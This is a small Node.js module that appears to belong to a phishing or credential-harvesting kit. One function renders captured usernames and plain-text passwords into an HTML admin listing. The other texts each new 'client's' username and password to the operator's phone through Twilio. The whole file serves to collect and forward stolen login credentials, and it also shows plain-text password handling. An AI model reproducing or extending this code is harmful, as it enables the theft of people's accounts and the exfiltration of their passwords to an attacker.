
 const twilio = require('twilio');
const dotenv = require('dotenv');

dotenv.config();
const htmlData = (html,object)=>{
      return object.map(data =>{
            let output =html.replace('{{%name%}}',data.user_name);
            output= output.replace('{{%password%}}',data.password);
            output= output.replace('{{%id%}}',data._id);
            output= output.replace('{{%date%}}',data.createAt);
            output= output.replace('{{%del%}}',data._id);
            return output;
      });
}

 const sendSMS = (data=>{
       const client = new twilio(process.env.TWILIO_SID ,process.env.TWILIO_AUTH);
       return client.messages.create({
            body:`\nYOU get a new client : ${data.user_name}, 
            ${data.password}`,from:process.env.TWILIO_PHONE, to:process.env.MY_PHONE})
             .catch(err =>{
                  console.log(err.message)
           });
     });

      module.exports = {htmlData,sendSMS};

